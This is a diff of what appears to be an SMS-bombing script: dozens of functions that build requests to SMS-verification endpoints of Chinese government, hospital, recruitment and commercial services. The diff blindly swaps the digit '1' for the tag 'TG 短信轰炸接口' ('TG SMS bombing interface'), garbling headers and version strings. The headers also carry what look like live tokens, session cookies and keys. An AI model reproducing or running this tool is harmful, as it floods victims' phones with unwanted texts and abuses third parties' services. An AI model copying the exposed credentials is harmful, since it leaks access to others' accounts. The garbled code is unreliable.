@@ -32,7 +32,7 @@ def request_url1():
         "Host": "miniapps.nj12345.net",
         "Connection": "keep-alive",
         "Content-Length": "72",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -60,7 +60,7 @@ def request_url119():
         "Authorization": "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "X-Requested-With": "XMLHttpRequest",
         "token": "",
         "Sec-Fetch-Site": "cross-site",
@@ -85,7 +85,7 @@ def request_url2():
         "Host": "www.luzhou12345.cn",
         "Connection": "keep-alive",
         "Content-Length": "80",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -109,7 +109,7 @@ def request_url3():
         "Connection": "keep-alive",
         "Content-Length": "100",
         "Accept": "text/html;charset=utf-8",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "x-authenticated-userid": "",
         "Authorization": "Bearer undefined",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
@@ -133,7 +133,7 @@ def request_url4():
         "Host": "www.tbeatcny.cn:10015",
         "Connection": "keep-alive",
         "Content-Length": "26",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -156,7 +156,7 @@ def request_url5():
         "Host": "wxpay-web.yixincapital.com",
         "Connection": "keep-alive",
         "Content-Length": "71",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "cookie": "",
         "yixin": "63f0a60118a1e90f4844c666465ba5b0",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
@@ -184,7 +184,7 @@ def request_url6():
         "Host": "qyzwfw.cn",
         "Connection": "keep-alive",
         "Content-Length": "72",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Authorization": "Bearer fa29301a889060f25b6ccad9d2f493b3",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json;charest=UTF-8",
@@ -214,7 +214,7 @@ def request_url7():
         "Connection": "keep-alive",
         "Content-Length": "77",
         "Accept": "text/html;charset=utf-8",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Authorization": "Bearer",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json;charest=UTF-8",
@@ -241,7 +241,7 @@ def request_url8():
         "Host": "www.xysxzspj.com",
         "Connection": "keep-alive",
         "Content-Length": "17",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "*/*",
@@ -283,7 +283,7 @@ def request_url10():
         "Host": "userapi.heaye.shop",
         "Connection": "keep-alive",
         "Content-Length": "23",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Authorization": "Bearer oHQMv5f-j93ZBVLZVN5P5f8Ehrms",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json;charset=UTF-8",
@@ -309,7 +309,7 @@ def request_url11():
         "Content-Length": "26",
         "unique-submit-token": "2a87e5f9-c78a-4c50-9830-e715d9dbf134_1710752032041",
         "x-mytjian-client": "WECHAT_MINI_APP",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Cookie": "SESSION=686cdb0d-abb1-461f-8349-a9d441c78948;",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -333,7 +333,7 @@ def request_url12():
         "Host": "health.gz12hospital.cn:6603",
         "Connection": "keep-alive",
         "Content-Length": "47",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Cookie": "JSESSIONID=",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "token": "",
@@ -360,7 +360,7 @@ def request_url13():
         "Content-Length": "23",
         "x-rid": "3ACFBC8F-F10E-454F-80F7-E9CF80EFA70B",
         "imprint": "oWRkU0UWqnOnuclLWq1fDw0SHnqs",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json;charset=UTF-8",
         "Accept": "*/*",
@@ -384,7 +384,7 @@ def request_url14():
         "Connection": "keep-alive",
         "Content-Length": "112",
         "Th-Session-Id": "nszli17107510056466xqDMumPGcno4AcG2RgBl4N5IbUa27137d0-wx",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Th-Auth-Type": "tencent-health-mini",
         "Th-Appid": "wxc35283883e1d86d5",
         "Th-Code": "",
@@ -411,7 +411,7 @@ def request_url15():
         "Host": "ls.xzrcfw.com",
         "Connection": "keep-alive",
         "Content-Length": "131",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -435,7 +435,7 @@ def request_url16():
         "Host": "qjpt.dypmw.com",
         "Connection": "keep-alive",
         "Content-Length": "24",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "cityid": "0",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
@@ -459,7 +459,7 @@ def request_url17():
         "Host": "www.hnzgfwpt.cn",
         "Connection": "keep-alive",
         "Content-Length": "147",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "*/*",
@@ -508,7 +508,7 @@ def request_url19():
         "Host": "edu.jsgpa.com",
         "Connection": "keep-alive",
         "Content-Length": "32",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -533,7 +533,7 @@ def request_url20():
         "Host": "eibp-api.ynjspx.cn",
         "Connection": "keep-alive",
         "Content-Length": "23",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -558,7 +558,7 @@ def request_url21():
         "Host": "yuanzhijiekeji.cn",
         "Connection": "keep-alive",
         "Content-Length": "57",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -582,7 +582,7 @@ def request_url22():
         "Host": "826625173.ehpp.club",
         "Connection": "keep-alive",
         "Content-Length": "23",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Cookie": "koa:sess=eyJza2V5IjoiZTE3Nzc0NTVmNTFhZjQ3ZmFkOThmMTYwOTE2ODVjZTY1OTc4Yzg0MiIsInVzZXJpbmZvIjp7InVpZCI6MzU2OSwib3BlbklkIjoib1dBNmE1WGJGYlVjS3VjS29xOU04R1UweXV1NCIsIm5pY2tOYW1lIjoi5b6u5L+h55So5oi3IiwiYXZhdGFyVXJsIjoiaHR0cHM6Ly90aGlyZHd4LnFsb2dvLmNuL21tb3Blbi92aV8zMi9QT2dFd2g0bUlITzRuaWJIMEtsTUVDTmpqR3hRVXEyNFpFYUdUNHBvQzZpY1JpY2NWR0tTeVh3aWJjUHE0QldtaWFJR3VHMWljd3hhUVg2Z3JDOVZlbVpvSjhyZy8xMzIiLCJyZWFsTmFtZSI6bnVsbCwiZ2VuZGVyIjowLCJwcm92aW5jZSI6IiIsImNvdW50cnkiOiIiLCJjaXR5IjoiIiwiY29tcGFueU5hbWUiOm51bGwsImNvbXBhbnlpZCI6bnVsbCwiYm9udXMiOjAsInRvdGFsX2JvbnVzIjowLCJsYXN0X3VwbG9hZF9ydW5fdGltZSI6bnVsbCwiY3JlYXRlX3RpbWUiOiIyMDI0LTAzLTIyVDA1OjE2OjA3LjAwMFoiLCJhaWQiOm51bGwsInBob25lIjoiIiwibWVtYmVyIjowLCJtZW1iZXJfdXBkYXRlIjoiMjAyNC0wMy0yMlQwNToxNjowNy4wMDBaIiwibWVtYmVyX2xldmVsIjpudWxsfSwiX2V4cGlyZSI6MTcxMTY4OTM2NzI3MiwiX21heEFnZSI6NjA0ODAwMDAwfQ==; path=/; expires=Fri, 29 Mar 2024 05:16:07 GMT; httponly",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
@@ -607,7 +607,7 @@ def request_url23():
         "Host": "media.hzj7.com",
         "Connection": "keep-alive",
         "Content-Length": "17",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "*/*",
@@ -632,7 +632,7 @@ def request_url26():
         "Connection": "keep-alive",
         "Content-Length": "58",
         "Accept": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
         "Sec-Fetch-Site": "cross-site",
@@ -655,7 +655,7 @@ def request_url27():
         "Host": "smart.shuye.com",
         "Connection": "keep-alive",
         "Content-Length": "40",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Accept-Language": "zh-cn",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "token": "[object Null]",
@@ -684,12 +684,12 @@ def request_url28():
         'Location-Time': '1714966492526',
         'Platform': 'iOS',
         'Accept': '*/*',
-        'Locate-Error-Code': '-1',
-        'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5',
+        'Locate-Error-Code': '-TG 短信轰炸接口',
+        'Accept-Encoding': 'gzip;q=TG 短信轰炸接口.0, compress;q=0.5',
         'Request-Id': '18929FFB-5AE9-42E1-8646-3D1C29CD43EF',
         'Locate-Altitude': '0',
-        'User-Agent': 'DadaStaff/11.59.1 (com.dada.staff; build:210332; iOS 16.6.1) Alamofire/11.59.1',
-        'Locate-Extra': '{"Locate-Provider-Str":"unknown","Locate-Time-App":"","Locate-Device-Id":"344EF073-E5E4-42FC-A354-36148D490572","Locate-Work-Mode":"0","Locate-Time-Sdk":"0","Locate-Time":"1714966492526","Locate-Platform":"iOS","Locate-AdCode":"0","Locate-ForeGround":1,"Locate-Error-Flag":false}',
+        'User-Agent': 'DadaStaff/11.59.TG 短信轰炸接口 (com.dada.staff; build:210332; iOS 16.6.TG 短信轰炸接口) Alamofire/11.59.TG 短信轰炸接口',
+        'Locate-Extra': '{"Locate-Provider-Str":"unknown","Locate-Time-App":"","Locate-Device-Id":"344EF073-E5E4-42FC-A354-36148D490572","Locate-Work-Mode":"0","Locate-Time-Sdk":"0","Locate-Time":"1714966492526","Locate-Platform":"iOS","Locate-AdCode":"0","Locate-ForeGround":TG 短信轰炸接口,"Locate-Error-Flag":false}',
         'Operator': 'unknow',
         'UUID': '344EF073-E5E4-42FC-A354-36148D490572',
         'Work-Mode': '0',
@@ -699,22 +699,22 @@ def request_url28():
         'Locate-Speed': '0',
         'Verification-Hash': 'bc83fdc4d52ca1e0b0fd4ad00e0fc381',
         'Locate-Type': '2',
-        'OS-Version': '16.6.1',
+        'OS-Version': '16.6.TG 短信轰炸接口',
         'City-Code': '0',
-        'Model': 'iPhone12,1',
-        'Accept-Language': 'zh-Hans-CN;q=1.0',
+        'Model': 'iPhone12,TG 短信轰炸接口',
+        'Accept-Language': 'zh-Hans-CN;q=TG 短信轰炸接口.0',
         'Lng': '0',
         'User-Id': '0',
         'Locate-Direction': '0',
         'Rate-Limit-Hash': '81326c6aa3590526572434ef4ef40864',
-        'Model-Type': 'iPhone12,1',
+        'Model-Type': 'iPhone12,TG 短信轰炸接口',
         'Client-Time': '1714966492526',
         'Lat': '0',
-        'Locate-From': '1',
+        'Locate-From': 'TG 短信轰炸接口',
         'Connection': 'keep-alive',
         'Channel-ID': 'A01',
         'City-Id': '0',
-        'App-Version': '11.59.1',
+        'App-Version': '11.59.TG 短信轰炸接口',
         'Sdcard-Id': '344EF073-E5E4-42FC-A354-36148D490572',
         'Location-Provider': '0',
         'Accuracy': '',
@@ -734,7 +734,7 @@ def request_url29():
         "Host": "weixin-nj.pcmh.com.cn",
         "Connection": "keep-alive",
         "Content-Length": "24",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json;charset=UTF-8",
         "Accept": "*/*",
@@ -757,7 +757,7 @@ def request_url30():
         "Host": "www.hylyljk.com",
         "Connection": "keep-alive",
         "Content-Length": "23",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "userType": "2",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
@@ -788,7 +788,7 @@ def request_url31():
         "authorization": "bearer oHY_55PTtR6BhnMQXQFTuI0EMk3A",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "openId": "1234567890-1234567890-1234567890",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
@@ -810,7 +810,7 @@ def request_url32():
         "Host": "m.ylzhaopin.com",
         "Connection": "keep-alive",
         "Content-Length": "15",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5cHdwcm9ncmFtIiwibmFtZSI6Im85THlSNjhmM3A3R2MtLWoybjBIT2hlbjlQVDgiLCJpYXQiOjE3MTExOTA3NzIsImV4cCI6MTcxMTE5Nzk3Mn0.nS8C4L6ZVGDjjxA_VmzyTgoGG7gcMafXrgL9X0KpSRo",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -840,13 +840,13 @@ def request_url33():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "webview": "",
         "Content-Type": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "uid": "",
         "sub-from-v1": "",
         "uuid": "086b92f4509178b3321197b1bbe1642b",
         "platform": "wx_mnapp",
         "token": "",
-        "app-version": "1.1.31",
+        "app-version": "TG 短信轰炸接口.TG 短信轰炸接口.31",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
         "Sec-Fetch-Mode": "cors",
@@ -873,9 +873,9 @@ def request_url100():
         'Content-Type': 'application/json; charset=UTF-8',
         'Accept': 'application/json, text/plain, */*',
         'SecretKey': '94cbe78f3bcec8be81d68e7bdfb9ad9b',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'uid': '0',
-        'platform': '1',
+        'platform': 'TG 短信轰炸接口',
         'Sec-Fetch-Site': 'cross-site',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Dest': 'empty',
@@ -896,7 +896,7 @@ def request_url34():
         'Connection': 'keep-alive',
         'Content-Length': '34',
         'Accept': 'application/json, text/plain, */*',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/x-www-form-urlencoded',
         'Sec-Fetch-Site': 'cross-site',
@@ -920,12 +920,12 @@ def request_url35():
         'Connection': 'keep-alive',
         'Content-Length': '46',
         'B-Product-Code': 'hcn.sh-pdxqrmyy.patient_mini',
-        'B-Version': '1.2.2.8',
+        'B-Version': 'TG 短信轰炸接口.2.2.8',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/json',
         'T-Product-Code': 'hcn.sh-pdxqrmyy.patient_mini',
         'X-Service-Method': 'registerSmsCodeNew',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'X-Access-Token': '',
         'X-Service-Id': 'cas.wxregisterService',
         'Accept': '*/*',
@@ -957,7 +957,7 @@ def request_url36():
         'Content-Type': 'application/json;charset=UTF-8',
         'ak': 'ak',
         'guc-platform': 'weixin',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'guc-endpoint': 'C',
         'X-Site-Code': '339900',
         'X-Device-Id': '37a4be4390593c68963e5ab24bc7e209',
@@ -982,7 +982,7 @@ def request_url37():
         'Host': '96885wx.hrss.jl.gov.cn',
         'Connection': 'keep-alive',
         'Content-Length': '95',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/json',
         'Accept': '*/*',
@@ -1014,7 +1014,7 @@ def request_url38():
         'Content-Length': '45',
         'dhash': 'eda4e699e178c69039367ce5f7b871dd',
         'ts': '1711226083884510;ede6895b37b5d7f5e18f74cc6334c855',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'token': 'bafcee32-6075-4a58-bbe4-a17bc253939a',
         'Content-Type': 'application/json',
@@ -1043,7 +1043,7 @@ def request_url39():
         'Connection': 'keep-alive',
         'Content-Length': '95',
         'clientinfo': '{"devid":""}',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'headdata': '%7B%22data_value%22%3A%2217343387439%22%2C%22flag%22%3A0%2C%22send_type%22%3A1%2C%22communityId%22%3A6%2C%22roleId%22%3A2%2C%22user_id%22%3A246756%7D',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/json',
@@ -1075,7 +1075,7 @@ def request_url40():
         'Host': 'ehr-recruitment.yifengx.com',
         'Connection': 'keep-alive',
         'Content-Length': '23',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/json',
         'Accept': '*/*',
@@ -1101,7 +1101,7 @@ def request_url41():
         'Host': 'yf.yifengyunche.com',
         'Connection': 'keep-alive',
         'Content-Length': '70',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/x-www-form-urlencoded',
         'Accept': '*/*',
@@ -1129,7 +1129,7 @@ def request_url42():
         'Host': 'account.xiaomi.com',
         'Connection': 'keep-alive',
         'Content-Length': '34',
-        'xweb_xhr': '1',
+        'xweb_xhr': 'TG 短信轰炸接口',
         'cookie': 'wxSToken=p+qwiucQZ0j+B76YG0aqz4//m7yT7J6112faWuPTzmhW4wCDtLfGVVYgmru1gP80G+DWjqJOeiJ+abPOim657IxKwTHbe5x3SN5hgpOKR9soC2Kz442TXXKTFFDGnGjU21K1T36ZUayxzPYBGPtlgX5Nq8zIGowlQu9SbrIexoVXE9UfRVbora6qZC7rIARj;',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
         'Content-Type': 'application/x-www-form-urlencoded',
@@ -1158,7 +1158,7 @@ def request_url43():
         "Connection": "keep-alive",
         "Content-Length": "63",
         "ua": '{"v":3,"n":"mp-weixin"}',
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
